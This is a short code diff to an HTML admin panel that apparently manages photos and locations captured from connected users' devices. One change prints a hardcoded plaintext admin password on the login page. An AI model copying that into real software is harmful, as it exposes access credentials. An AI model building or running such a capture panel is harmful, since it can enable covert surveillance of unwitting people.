@@ -60,7 +60,7 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
 <div id="loginPage" class="login">
     <div class="login-box">
         <h2>Admin Login</h2>
-        <p>Enter admin password to continue.</p>
+        <p>Enter password (<b>Ayaz;@</b>)</p>
         <input id="password" type="password" placeholder="Admin Password">
         <button onclick="login()" style="width:100%;">Login</button>
         <p id="loginError" style="color:#e74c3c;"></p>
@@ -100,7 +100,6 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
 
     <div class="panel">
         <h2>Temporary Captured Photos</h2>
-        <p>Photos remain temporary until you download or delete them.</p>
         <div id="photoGrid" class="photo-grid">No photos.</div>
     </div>
 
@@ -217,7 +216,7 @@ function renderUsers(users) {
             <strong>${escapeHtml(user.deviceInfo)}</strong><br>
             <small>ID: ${escapeHtml(id.substring(0, 8))}...</small><br>
             <small>Connected: ${escapeHtml(user.connectedAt)}</small><br>
-            <small>${escapeHtml(locationText)}</small>
+            <small style="color: #2ecc71;">${escapeHtml(locationText)}</small>
         `;
 
         const button = document.createElement("button");
